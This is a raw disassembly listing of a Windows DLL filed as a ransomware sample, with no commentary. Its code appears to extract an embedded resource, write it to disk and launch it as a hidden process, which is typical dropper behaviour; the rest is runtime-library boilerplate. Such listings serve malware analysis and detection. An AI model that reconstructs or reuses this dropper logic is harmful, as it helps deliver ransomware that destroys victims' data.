
malware_samples/ransomware/9487edf9b75f4c15e3ba6ccbae23588ee3dc9c4983417f1b469278af17fc3847.exe:     file format pei-x86-64


Disassembly of section .text:

0000000180001000 <.text>:
   180001000:	ff ca                	dec    %edx
   180001002:	75 07                	jne    0x18000100b
   180001004:	48 89 0d 9d c3 00 00 	mov    %rcx,0xc39d(%rip)        # 0x18000d3a8
   18000100b:	b8 01 00 00 00       	mov    $0x1,%eax
   180001010:	c3                   	ret
   180001011:	cc                   	int3
   180001012:	cc                   	int3
   180001013:	cc                   	int3
   180001014:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180001019:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000101e:	57                   	push   %rdi
   18000101f:	48 83 ec 40          	sub    $0x40,%rsp
   180001023:	48 8b 0d 7e c3 00 00 	mov    0xc37e(%rip),%rcx        # 0x18000d3a8
   18000102a:	4c 8d 05 7f 82 00 00 	lea    0x827f(%rip),%r8        # 0x1800092b0
   180001031:	ba 65 00 00 00       	mov    $0x65,%edx
   180001036:	ff 15 f4 7f 00 00    	call   *0x7ff4(%rip)        # 0x180009030
   18000103c:	48 8b d8             	mov    %rax,%rbx
   18000103f:	48 85 c0             	test   %rax,%rax
   180001042:	75 07                	jne    0x18000104b
   180001044:	33 c0                	xor    %eax,%eax
   180001046:	e9 9c 00 00 00       	jmp    0x1800010e7
   18000104b:	48 8b 0d 56 c3 00 00 	mov    0xc356(%rip),%rcx        # 0x18000d3a8
   180001052:	48 8b d0             	mov    %rax,%rdx
   180001055:	ff 15 cd 7f 00 00    	call   *0x7fcd(%rip)        # 0x180009028
   18000105b:	48 85 c0             	test   %rax,%rax
   18000105e:	74 e4                	je     0x180001044
   180001060:	48 8b c8             	mov    %rax,%rcx
   180001063:	ff 15 b7 7f 00 00    	call   *0x7fb7(%rip)        # 0x180009020
   180001069:	48 8b f8             	mov    %rax,%rdi
   18000106c:	48 85 c0             	test   %rax,%rax
   18000106f:	74 d3                	je     0x180001044
   180001071:	48 8b 0d 30 c3 00 00 	mov    0xc330(%rip),%rcx        # 0x18000d3a8
   180001078:	48 8b d3             	mov    %rbx,%rdx
   18000107b:	ff 15 97 7f 00 00    	call   *0x7f97(%rip)        # 0x180009018
   180001081:	85 c0                	test   %eax,%eax
   180001083:	74 bf                	je     0x180001044
   180001085:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   18000108b:	8b 37                	mov    (%rdi),%esi
   18000108d:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   180001093:	48 8d 0d 06 c2 00 00 	lea    0xc206(%rip),%rcx        # 0x18000d2a0
   18000109a:	45 33 c9             	xor    %r9d,%r9d
   18000109d:	ba 00 00 00 40       	mov    $0x40000000,%edx
   1800010a2:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   1800010a9:	00 
   1800010aa:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
   1800010af:	ff 15 5b 7f 00 00    	call   *0x7f5b(%rip)        # 0x180009010
   1800010b5:	48 8b d8             	mov    %rax,%rbx
   1800010b8:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1800010bc:	74 24                	je     0x1800010e2
   1800010be:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   1800010c4:	48 8d 57 04          	lea    0x4(%rdi),%rdx
   1800010c8:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   1800010cd:	44 8b c6             	mov    %esi,%r8d
   1800010d0:	48 8b c8             	mov    %rax,%rcx
   1800010d3:	ff 15 2f 7f 00 00    	call   *0x7f2f(%rip)        # 0x180009008
   1800010d9:	48 8b cb             	mov    %rbx,%rcx
   1800010dc:	ff 15 1e 7f 00 00    	call   *0x7f1e(%rip)        # 0x180009000
   1800010e2:	b8 01 00 00 00       	mov    $0x1,%eax
   1800010e7:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   1800010ec:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   1800010f1:	48 83 c4 40          	add    $0x40,%rsp
   1800010f5:	5f                   	pop    %rdi
   1800010f6:	c3                   	ret
   1800010f7:	cc                   	int3
   1800010f8:	40 53                	rex push %rbx
   1800010fa:	48 81 ec e0 00 00 00 	sub    $0xe0,%rsp
   180001101:	33 c0                	xor    %eax,%eax
   180001103:	33 db                	xor    %ebx,%ebx
   180001105:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   18000110a:	44 8d 43 60          	lea    0x60(%rbx),%r8d
   18000110e:	33 d2                	xor    %edx,%edx
   180001110:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   180001115:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   18000111a:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   18000111f:	e8 cc 00 00 00       	call   0x1800011f0
   180001124:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   180001129:	48 8d 15 70 c1 00 00 	lea    0xc170(%rip),%rdx        # 0x18000d2a0
   180001130:	45 33 c9             	xor    %r9d,%r9d
   180001133:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   180001138:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   18000113d:	45 33 c0             	xor    %r8d,%r8d
   180001140:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   180001145:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   18000114a:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   18000114f:	33 c9                	xor    %ecx,%ecx
   180001151:	c7 44 24 28 00 00 00 	movl   $0x8000000,0x28(%rsp)
   180001158:	08 
   180001159:	c7 44 24 70 68 00 00 	movl   $0x68,0x70(%rsp)
   180001160:	00 
   180001161:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   180001165:	66 89 9c 24 b0 00 00 	mov    %bx,0xb0(%rsp)
   18000116c:	00 
   18000116d:	c7 84 24 ac 00 00 00 	movl   $0x81,0xac(%rsp)
   180001174:	81 00 00 00 
   180001178:	ff 15 ba 7e 00 00    	call   *0x7eba(%rip)        # 0x180009038
   18000117e:	85 c0                	test   %eax,%eax
   180001180:	74 16                	je     0x180001198
   180001182:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   180001187:	ff 15 73 7e 00 00    	call   *0x7e73(%rip)        # 0x180009000
   18000118d:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   180001192:	ff 15 68 7e 00 00    	call   *0x7e68(%rip)        # 0x180009000
   180001198:	33 c0                	xor    %eax,%eax
   18000119a:	48 81 c4 e0 00 00 00 	add    $0xe0,%rsp
   1800011a1:	5b                   	pop    %rbx
   1800011a2:	c3                   	ret
   1800011a3:	cc                   	int3
   1800011a4:	48 83 ec 28          	sub    $0x28,%rsp
   1800011a8:	4c 8d 0d 21 81 00 00 	lea    0x8121(%rip),%r9        # 0x1800092d0
   1800011af:	4c 8d 05 12 81 00 00 	lea    0x8112(%rip),%r8        # 0x1800092c8
   1800011b6:	48 8d 15 fb 80 00 00 	lea    0x80fb(%rip),%rdx        # 0x1800092b8
   1800011bd:	48 8d 0d dc c0 00 00 	lea    0xc0dc(%rip),%rcx        # 0x18000d2a0
   1800011c4:	e8 13 01 00 00       	call   0x1800012dc
   1800011c9:	e8 46 fe ff ff       	call   0x180001014
   1800011ce:	e8 25 ff ff ff       	call   0x1800010f8
   1800011d3:	33 c0                	xor    %eax,%eax
   1800011d5:	48 83 c4 28          	add    $0x28,%rsp
   1800011d9:	c3                   	ret
   1800011da:	cc                   	int3
   1800011db:	cc                   	int3
   1800011dc:	cc                   	int3
   1800011dd:	cc                   	int3
   1800011de:	cc                   	int3
   1800011df:	cc                   	int3
   1800011e0:	cc                   	int3
   1800011e1:	cc                   	int3
   1800011e2:	cc                   	int3
   1800011e3:	cc                   	int3
   1800011e4:	cc                   	int3
   1800011e5:	cc                   	int3
   1800011e6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1800011ed:	00 00 00 
   1800011f0:	48 8b c1             	mov    %rcx,%rax
   1800011f3:	49 83 f8 08          	cmp    $0x8,%r8
   1800011f7:	72 53                	jb     0x18000124c
   1800011f9:	0f b6 d2             	movzbl %dl,%edx
   1800011fc:	49 b9 01 01 01 01 01 	movabs $0x101010101010101,%r9
   180001203:	01 01 01 
   180001206:	49 0f af d1          	imul   %r9,%rdx
   18000120a:	49 83 f8 40          	cmp    $0x40,%r8
   18000120e:	72 1e                	jb     0x18000122e
   180001210:	48 f7 d9             	neg    %rcx
   180001213:	83 e1 07             	and    $0x7,%ecx
   180001216:	74 06                	je     0x18000121e
   180001218:	4c 2b c1             	sub    %rcx,%r8
   18000121b:	48 89 10             	mov    %rdx,(%rax)
   18000121e:	48 03 c8             	add    %rax,%rcx
   180001221:	4d 8b c8             	mov    %r8,%r9
   180001224:	49 83 e0 3f          	and    $0x3f,%r8
   180001228:	49 c1 e9 06          	shr    $0x6,%r9
   18000122c:	75 39                	jne    0x180001267
   18000122e:	4d 8b c8             	mov    %r8,%r9
   180001231:	49 83 e0 07          	and    $0x7,%r8
   180001235:	49 c1 e9 03          	shr    $0x3,%r9
   180001239:	74 11                	je     0x18000124c
   18000123b:	66 66 66 90          	data16 data16 xchg %ax,%ax
   18000123f:	90                   	nop
   180001240:	48 89 11             	mov    %rdx,(%rcx)
   180001243:	48 83 c1 08          	add    $0x8,%rcx
   180001247:	49 ff c9             	dec    %r9
   18000124a:	75 f4                	jne    0x180001240
   18000124c:	4d 85 c0             	test   %r8,%r8
   18000124f:	74 0a                	je     0x18000125b
   180001251:	88 11                	mov    %dl,(%rcx)
   180001253:	48 ff c1             	inc    %rcx
   180001256:	49 ff c8             	dec    %r8
   180001259:	75 f6                	jne    0x180001251
   18000125b:	c3                   	ret
   18000125c:	0f 1f 40 00          	nopl   0x0(%rax)
   180001260:	66 66 66 90          	data16 data16 xchg %ax,%ax
   180001264:	66 66 90             	data16 xchg %ax,%ax
   180001267:	49 81 f9 00 1c 00 00 	cmp    $0x1c00,%r9
   18000126e:	73 30                	jae    0x1800012a0
   180001270:	48 89 11             	mov    %rdx,(%rcx)
   180001273:	48 89 51 08          	mov    %rdx,0x8(%rcx)
   180001277:	48 89 51 10          	mov    %rdx,0x10(%rcx)
   18000127b:	48 83 c1 40          	add    $0x40,%rcx
   18000127f:	48 89 51 d8          	mov    %rdx,-0x28(%rcx)
   180001283:	48 89 51 e0          	mov    %rdx,-0x20(%rcx)
   180001287:	49 ff c9             	dec    %r9
   18000128a:	48 89 51 e8          	mov    %rdx,-0x18(%rcx)
   18000128e:	48 89 51 f0          	mov    %rdx,-0x10(%rcx)
   180001292:	48 89 51 f8          	mov    %rdx,-0x8(%rcx)
   180001296:	75 d8                	jne    0x180001270
   180001298:	eb 94                	jmp    0x18000122e
   18000129a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1800012a0:	48 0f c3 11          	movnti %rdx,(%rcx)
   1800012a4:	48 0f c3 51 08       	movnti %rdx,0x8(%rcx)
   1800012a9:	48 0f c3 51 10       	movnti %rdx,0x10(%rcx)
   1800012ae:	48 83 c1 40          	add    $0x40,%rcx
   1800012b2:	48 0f c3 51 d8       	movnti %rdx,-0x28(%rcx)
   1800012b7:	48 0f c3 51 e0       	movnti %rdx,-0x20(%rcx)
   1800012bc:	49 ff c9             	dec    %r9
   1800012bf:	48 0f c3 51 e8       	movnti %rdx,-0x18(%rcx)
   1800012c4:	48 0f c3 51 f0       	movnti %rdx,-0x10(%rcx)
   1800012c9:	48 0f c3 51 f8       	movnti %rdx,-0x8(%rcx)
   1800012ce:	75 d0                	jne    0x1800012a0
   1800012d0:	f0 80 0c 24 00       	lock orb $0x0,(%rsp)
   1800012d5:	e9 54 ff ff ff       	jmp    0x18000122e
   1800012da:	cc                   	int3
   1800012db:	cc                   	int3
   1800012dc:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1800012e1:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   1800012e6:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1800012eb:	55                   	push   %rbp
   1800012ec:	53                   	push   %rbx
   1800012ed:	57                   	push   %rdi
   1800012ee:	48 8b ec             	mov    %rsp,%rbp
   1800012f1:	48 83 ec 50          	sub    $0x50,%rsp
   1800012f5:	48 83 65 d0 00       	andq   $0x0,-0x30(%rbp)
   1800012fa:	48 8b fa             	mov    %rdx,%rdi
   1800012fd:	33 d2                	xor    %edx,%edx
   1800012ff:	48 8b d9             	mov    %rcx,%rbx
   180001302:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   180001306:	44 8d 42 28          	lea    0x28(%rdx),%r8d
   18000130a:	e8 e1 fe ff ff       	call   0x1800011f0
   18000130f:	48 85 ff             	test   %rdi,%rdi
   180001312:	75 15                	jne    0x180001329
   180001314:	e8 87 13 00 00       	call   0x1800026a0
   180001319:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   18000131f:	e8 14 13 00 00       	call   0x180002638
   180001324:	83 c8 ff             	or     $0xffffffff,%eax
   180001327:	eb 4b                	jmp    0x180001374
   180001329:	48 85 db             	test   %rbx,%rbx
   18000132c:	74 e6                	je     0x180001314
   18000132e:	4c 8d 4d 30          	lea    0x30(%rbp),%r9
   180001332:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   180001336:	45 33 c0             	xor    %r8d,%r8d
   180001339:	48 8b d7             	mov    %rdi,%rdx
   18000133c:	c7 45 d8 ff ff ff 7f 	movl   $0x7fffffff,-0x28(%rbp)
   180001343:	c7 45 e8 42 00 00 00 	movl   $0x42,-0x18(%rbp)
   18000134a:	48 89 5d e0          	mov    %rbx,-0x20(%rbp)
   18000134e:	48 89 5d d0          	mov    %rbx,-0x30(%rbp)
   180001352:	e8 3d 06 00 00       	call   0x180001994
   180001357:	ff 4d d8             	decl   -0x28(%rbp)
   18000135a:	8b d8                	mov    %eax,%ebx
   18000135c:	78 09                	js     0x180001367
   18000135e:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
   180001362:	c6 01 00             	movb   $0x0,(%rcx)
   180001365:	eb 0b                	jmp    0x180001372
   180001367:	48 8d 55 d0          	lea    -0x30(%rbp),%rdx
   18000136b:	33 c9                	xor    %ecx,%ecx
   18000136d:	e8 ba 02 00 00       	call   0x18000162c
   180001372:	8b c3                	mov    %ebx,%eax
   180001374:	48 83 c4 50          	add    $0x50,%rsp
   180001378:	5f                   	pop    %rdi
   180001379:	5b                   	pop    %rbx
   18000137a:	5d                   	pop    %rbp
   18000137b:	c3                   	ret
   18000137c:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   180001381:	53                   	push   %rbx
   180001382:	48 83 ec 20          	sub    $0x20,%rsp
   180001386:	49 8b d8             	mov    %r8,%rbx
   180001389:	83 fa 01             	cmp    $0x1,%edx
   18000138c:	75 7d                	jne    0x18000140b
   18000138e:	e8 39 27 00 00       	call   0x180003acc
   180001393:	85 c0                	test   %eax,%eax
   180001395:	75 07                	jne    0x18000139e
   180001397:	33 c0                	xor    %eax,%eax
   180001399:	e9 2a 01 00 00       	jmp    0x1800014c8
   18000139e:	e8 91 18 00 00       	call   0x180002c34
   1800013a3:	85 c0                	test   %eax,%eax
   1800013a5:	75 07                	jne    0x1800013ae
   1800013a7:	e8 78 27 00 00       	call   0x180003b24
   1800013ac:	eb e9                	jmp    0x180001397
   1800013ae:	e8 a9 26 00 00       	call   0x180003a5c
   1800013b3:	ff 15 97 7c 00 00    	call   *0x7c97(%rip)        # 0x180009050
   1800013b9:	48 89 05 98 e2 00 00 	mov    %rax,0xe298(%rip)        # 0x18000f658
   1800013c0:	e8 a3 25 00 00       	call   0x180003968
   1800013c5:	48 89 05 ec bf 00 00 	mov    %rax,0xbfec(%rip)        # 0x18000d3b8
   1800013cc:	e8 57 1e 00 00       	call   0x180003228
   1800013d1:	85 c0                	test   %eax,%eax
   1800013d3:	79 07                	jns    0x1800013dc
   1800013d5:	e8 5e 15 00 00       	call   0x180002938
   1800013da:	eb cb                	jmp    0x1800013a7
   1800013dc:	e8 8f 24 00 00       	call   0x180003870
   1800013e1:	85 c0                	test   %eax,%eax
   1800013e3:	78 1f                	js     0x180001404
   1800013e5:	e8 86 21 00 00       	call   0x180003570
   1800013ea:	85 c0                	test   %eax,%eax
   1800013ec:	78 16                	js     0x180001404
   1800013ee:	33 c9                	xor    %ecx,%ecx
   1800013f0:	e8 af 1b 00 00       	call   0x180002fa4
   1800013f5:	85 c0                	test   %eax,%eax
   1800013f7:	75 0b                	jne    0x180001404
   1800013f9:	ff 05 b1 bf 00 00    	incl   0xbfb1(%rip)        # 0x18000d3b0
   1800013ff:	e9 bf 00 00 00       	jmp    0x1800014c3
   180001404:	e8 f3 20 00 00       	call   0x1800034fc
   180001409:	eb ca                	jmp    0x1800013d5
   18000140b:	85 d2                	test   %edx,%edx
   18000140d:	75 4d                	jne    0x18000145c
   18000140f:	8b 05 9b bf 00 00    	mov    0xbf9b(%rip),%eax        # 0x18000d3b0
   180001415:	85 c0                	test   %eax,%eax
   180001417:	0f 8e 7a ff ff ff    	jle    0x180001397
   18000141d:	ff c8                	dec    %eax
   18000141f:	89 05 8b bf 00 00    	mov    %eax,0xbf8b(%rip)        # 0x18000d3b0
   180001425:	39 15 01 c0 00 00    	cmp    %edx,0xc001(%rip)        # 0x18000d42c
   18000142b:	75 05                	jne    0x180001432
   18000142d:	e8 be 1d 00 00       	call   0x1800031f0
   180001432:	48 85 db             	test   %rbx,%rbx
   180001435:	75 10                	jne    0x180001447
   180001437:	e8 c0 20 00 00       	call   0x1800034fc
   18000143c:	e8 f7 14 00 00       	call   0x180002938
   180001441:	e8 de 26 00 00       	call   0x180003b24
   180001446:	90                   	nop
   180001447:	48 85 db             	test   %rbx,%rbx
   18000144a:	75 77                	jne    0x1800014c3
   18000144c:	83 3d 2d ad 00 00 ff 	cmpl   $0xffffffff,0xad2d(%rip)        # 0x18000c180
   180001453:	74 6e                	je     0x1800014c3
   180001455:	e8 de 14 00 00       	call   0x180002938
   18000145a:	eb 67                	jmp    0x1800014c3
   18000145c:	83 fa 02             	cmp    $0x2,%edx
   18000145f:	75 56                	jne    0x1800014b7
   180001461:	e8 ce 14 00 00       	call   0x180002934
   180001466:	ba c8 02 00 00       	mov    $0x2c8,%edx
   18000146b:	b9 01 00 00 00       	mov    $0x1,%ecx
   180001470:	e8 03 19 00 00       	call   0x180002d78
   180001475:	48 8b d8             	mov    %rax,%rbx
   180001478:	48 85 c0             	test   %rax,%rax
   18000147b:	0f 84 16 ff ff ff    	je     0x180001397
   180001481:	48 8b d0             	mov    %rax,%rdx
   180001484:	8b 0d f6 ac 00 00    	mov    0xacf6(%rip),%ecx        # 0x18000c180
   18000148a:	ff 15 b8 7b 00 00    	call   *0x7bb8(%rip)        # 0x180009048
   180001490:	48 8b cb             	mov    %rbx,%rcx
   180001493:	85 c0                	test   %eax,%eax
   180001495:	74 16                	je     0x1800014ad
   180001497:	33 d2                	xor    %edx,%edx
   180001499:	e8 c2 14 00 00       	call   0x180002960
   18000149e:	ff 15 9c 7b 00 00    	call   *0x7b9c(%rip)        # 0x180009040
   1800014a4:	89 03                	mov    %eax,(%rbx)
   1800014a6:	48 83 4b 08 ff       	orq    $0xffffffffffffffff,0x8(%rbx)
   1800014ab:	eb 16                	jmp    0x1800014c3
   1800014ad:	e8 06 18 00 00       	call   0x180002cb8
   1800014b2:	e9 e0 fe ff ff       	jmp    0x180001397
   1800014b7:	83 fa 03             	cmp    $0x3,%edx
   1800014ba:	75 07                	jne    0x1800014c3
   1800014bc:	33 c9                	xor    %ecx,%ecx
   1800014be:	e8 31 17 00 00       	call   0x180002bf4
   1800014c3:	b8 01 00 00 00       	mov    $0x1,%eax
   1800014c8:	48 83 c4 20          	add    $0x20,%rsp
   1800014cc:	5b                   	pop    %rbx
   1800014cd:	c3                   	ret
   1800014ce:	cc                   	int3
   1800014cf:	cc                   	int3
   1800014d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800014d5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1800014da:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   1800014df:	41 54                	push   %r12
   1800014e1:	48 83 ec 30          	sub    $0x30,%rsp
   1800014e5:	49 8b f0             	mov    %r8,%rsi
   1800014e8:	8b da                	mov    %edx,%ebx
   1800014ea:	4c 8b e1             	mov    %rcx,%r12
   1800014ed:	b8 01 00 00 00       	mov    $0x1,%eax
   1800014f2:	85 d2                	test   %edx,%edx
   1800014f4:	75 0f                	jne    0x180001505
   1800014f6:	39 15 b4 be 00 00    	cmp    %edx,0xbeb4(%rip)        # 0x18000d3b0
   1800014fc:	75 07                	jne    0x180001505
   1800014fe:	33 c0                	xor    %eax,%eax
   180001500:	e9 d0 00 00 00       	jmp    0x1800015d5
   180001505:	83 fa 01             	cmp    $0x1,%edx
   180001508:	74 05                	je     0x18000150f
   18000150a:	83 fa 02             	cmp    $0x2,%edx
   18000150d:	75 33                	jne    0x180001542
   18000150f:	4c 8b 0d ca 7d 00 00 	mov    0x7dca(%rip),%r9        # 0x1800092e0
   180001516:	4d 85 c9             	test   %r9,%r9
   180001519:	74 07                	je     0x180001522
   18000151b:	41 ff d1             	call   *%r9
   18000151e:	89 44 24 20          	mov    %eax,0x20(%rsp)
   180001522:	85 c0                	test   %eax,%eax
   180001524:	74 15                	je     0x18000153b
   180001526:	4c 8b c6             	mov    %rsi,%r8
   180001529:	8b d3                	mov    %ebx,%edx
   18000152b:	49 8b cc             	mov    %r12,%rcx
   18000152e:	e8 49 fe ff ff       	call   0x18000137c
   180001533:	89 44 24 20          	mov    %eax,0x20(%rsp)
   180001537:	85 c0                	test   %eax,%eax
   180001539:	75 07                	jne    0x180001542
   18000153b:	33 c0                	xor    %eax,%eax
   18000153d:	e9 93 00 00 00       	jmp    0x1800015d5
   180001542:	4c 8b c6             	mov    %rsi,%r8
   180001545:	8b d3                	mov    %ebx,%edx
   180001547:	49 8b cc             	mov    %r12,%rcx
   18000154a:	e8 b1 fa ff ff       	call   0x180001000
   18000154f:	8b f8                	mov    %eax,%edi
   180001551:	89 44 24 20          	mov    %eax,0x20(%rsp)
   180001555:	83 fb 01             	cmp    $0x1,%ebx
   180001558:	75 35                	jne    0x18000158f
   18000155a:	85 c0                	test   %eax,%eax
   18000155c:	75 31                	jne    0x18000158f
   18000155e:	4c 8b c6             	mov    %rsi,%r8
   180001561:	33 d2                	xor    %edx,%edx
   180001563:	49 8b cc             	mov    %r12,%rcx
   180001566:	e8 95 fa ff ff       	call   0x180001000
   18000156b:	4c 8b c6             	mov    %rsi,%r8
   18000156e:	33 d2                	xor    %edx,%edx
   180001570:	49 8b cc             	mov    %r12,%rcx
   180001573:	e8 04 fe ff ff       	call   0x18000137c
   180001578:	4c 8b 1d 61 7d 00 00 	mov    0x7d61(%rip),%r11        # 0x1800092e0
   18000157f:	4d 85 db             	test   %r11,%r11
   180001582:	74 0b                	je     0x18000158f
   180001584:	4c 8b c6             	mov    %rsi,%r8
   180001587:	33 d2                	xor    %edx,%edx
   180001589:	49 8b cc             	mov    %r12,%rcx
   18000158c:	41 ff d3             	call   *%r11
   18000158f:	85 db                	test   %ebx,%ebx
   180001591:	74 05                	je     0x180001598
   180001593:	83 fb 03             	cmp    $0x3,%ebx
   180001596:	75 37                	jne    0x1800015cf
   180001598:	4c 8b c6             	mov    %rsi,%r8
   18000159b:	8b d3                	mov    %ebx,%edx
   18000159d:	49 8b cc             	mov    %r12,%rcx
   1800015a0:	e8 d7 fd ff ff       	call   0x18000137c
   1800015a5:	f7 d8                	neg    %eax
   1800015a7:	1b c9                	sbb    %ecx,%ecx
   1800015a9:	23 cf                	and    %edi,%ecx
   1800015ab:	8b f9                	mov    %ecx,%edi
   1800015ad:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   1800015b1:	74 1c                	je     0x1800015cf
   1800015b3:	48 8b 05 26 7d 00 00 	mov    0x7d26(%rip),%rax        # 0x1800092e0
   1800015ba:	48 85 c0             	test   %rax,%rax
   1800015bd:	74 10                	je     0x1800015cf
   1800015bf:	4c 8b c6             	mov    %rsi,%r8
   1800015c2:	8b d3                	mov    %ebx,%edx
   1800015c4:	49 8b cc             	mov    %r12,%rcx
   1800015c7:	ff d0                	call   *%rax
   1800015c9:	8b f8                	mov    %eax,%edi
   1800015cb:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1800015cf:	8b c7                	mov    %edi,%eax
   1800015d1:	eb 02                	jmp    0x1800015d5
   1800015d3:	33 c0                	xor    %eax,%eax
   1800015d5:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1800015da:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   1800015df:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   1800015e4:	48 83 c4 30          	add    $0x30,%rsp
   1800015e8:	41 5c                	pop    %r12
   1800015ea:	c3                   	ret
   1800015eb:	cc                   	int3
   1800015ec:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800015f1:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1800015f6:	57                   	push   %rdi
   1800015f7:	48 83 ec 20          	sub    $0x20,%rsp
   1800015fb:	49 8b f8             	mov    %r8,%rdi
   1800015fe:	8b da                	mov    %edx,%ebx
   180001600:	48 8b f1             	mov    %rcx,%rsi
   180001603:	83 fa 01             	cmp    $0x1,%edx
   180001606:	75 05                	jne    0x18000160d
   180001608:	e8 1b 27 00 00       	call   0x180003d28
   18000160d:	4c 8b c7             	mov    %rdi,%r8
   180001610:	8b d3                	mov    %ebx,%edx
   180001612:	48 8b ce             	mov    %rsi,%rcx
   180001615:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000161a:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   18000161f:	48 83 c4 20          	add    $0x20,%rsp
   180001623:	5f                   	pop    %rdi
   180001624:	e9 a7 fe ff ff       	jmp    0x1800014d0
   180001629:	cc                   	int3
   18000162a:	cc                   	int3
   18000162b:	cc                   	int3
   18000162c:	48 8b c4             	mov    %rsp,%rax
   18000162f:	48 89 58 10          	mov    %rbx,0x10(%rax)
   180001633:	48 89 68 18          	mov    %rbp,0x18(%rax)
   180001637:	48 89 70 20          	mov    %rsi,0x20(%rax)
   18000163b:	89 48 08             	mov    %ecx,0x8(%rax)
   18000163e:	57                   	push   %rdi
   18000163f:	48 83 ec 20          	sub    $0x20,%rsp
   180001643:	48 8b ca             	mov    %rdx,%rcx
   180001646:	48 8b da             	mov    %rdx,%rbx
   180001649:	e8 12 34 00 00       	call   0x180004a60
   18000164e:	8b 4b 18             	mov    0x18(%rbx),%ecx
   180001651:	48 63 f0             	movslq %eax,%rsi
   180001654:	f6 c1 82             	test   $0x82,%cl
   180001657:	75 17                	jne    0x180001670
   180001659:	e8 42 10 00 00       	call   0x1800026a0
   18000165e:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   180001664:	83 4b 18 20          	orl    $0x20,0x18(%rbx)
   180001668:	83 c8 ff             	or     $0xffffffff,%eax
   18000166b:	e9 34 01 00 00       	jmp    0x1800017a4
   180001670:	f6 c1 40             	test   $0x40,%cl
   180001673:	74 0d                	je     0x180001682
   180001675:	e8 26 10 00 00       	call   0x1800026a0
   18000167a:	c7 00 22 00 00 00    	movl   $0x22,(%rax)
   180001680:	eb e2                	jmp    0x180001664
   180001682:	33 ff                	xor    %edi,%edi
   180001684:	f6 c1 01             	test   $0x1,%cl
   180001687:	74 19                	je     0x1800016a2
   180001689:	89 7b 08             	mov    %edi,0x8(%rbx)
   18000168c:	f6 c1 10             	test   $0x10,%cl
   18000168f:	0f 84 89 00 00 00    	je     0x18000171e
   180001695:	48 8b 43 10          	mov    0x10(%rbx),%rax
   180001699:	83 e1 fe             	and    $0xfffffffe,%ecx
   18000169c:	48 89 03             	mov    %rax,(%rbx)
   18000169f:	89 4b 18             	mov    %ecx,0x18(%rbx)
   1800016a2:	8b 43 18             	mov    0x18(%rbx),%eax
   1800016a5:	89 7b 08             	mov    %edi,0x8(%rbx)
   1800016a8:	83 e0 ef             	and    $0xffffffef,%eax
   1800016ab:	83 c8 02             	or     $0x2,%eax
   1800016ae:	89 43 18             	mov    %eax,0x18(%rbx)
   1800016b1:	a9 0c 01 00 00       	test   $0x10c,%eax
   1800016b6:	75 2f                	jne    0x1800016e7
   1800016b8:	e8 8f 31 00 00       	call   0x18000484c
   1800016bd:	48 83 c0 30          	add    $0x30,%rax
   1800016c1:	48 3b d8             	cmp    %rax,%rbx
   1800016c4:	74 0e                	je     0x1800016d4
   1800016c6:	e8 81 31 00 00       	call   0x18000484c
   1800016cb:	48 83 c0 60          	add    $0x60,%rax
   1800016cf:	48 3b d8             	cmp    %rax,%rbx
   1800016d2:	75 0b                	jne    0x1800016df
   1800016d4:	8b ce                	mov    %esi,%ecx
   1800016d6:	e8 11 31 00 00       	call   0x1800047ec
   1800016db:	85 c0                	test   %eax,%eax
   1800016dd:	75 08                	jne    0x1800016e7
   1800016df:	48 8b cb             	mov    %rbx,%rcx
   1800016e2:	e8 b1 30 00 00       	call   0x180004798
   1800016e7:	f7 43 18 08 01 00 00 	testl  $0x108,0x18(%rbx)
   1800016ee:	0f 84 8d 00 00 00    	je     0x180001781
   1800016f4:	8b 2b                	mov    (%rbx),%ebp
   1800016f6:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   1800016fa:	2b 6b 10             	sub    0x10(%rbx),%ebp
   1800016fd:	48 8d 42 01          	lea    0x1(%rdx),%rax
   180001701:	48 89 03             	mov    %rax,(%rbx)
   180001704:	8b 43 24             	mov    0x24(%rbx),%eax
   180001707:	ff c8                	dec    %eax
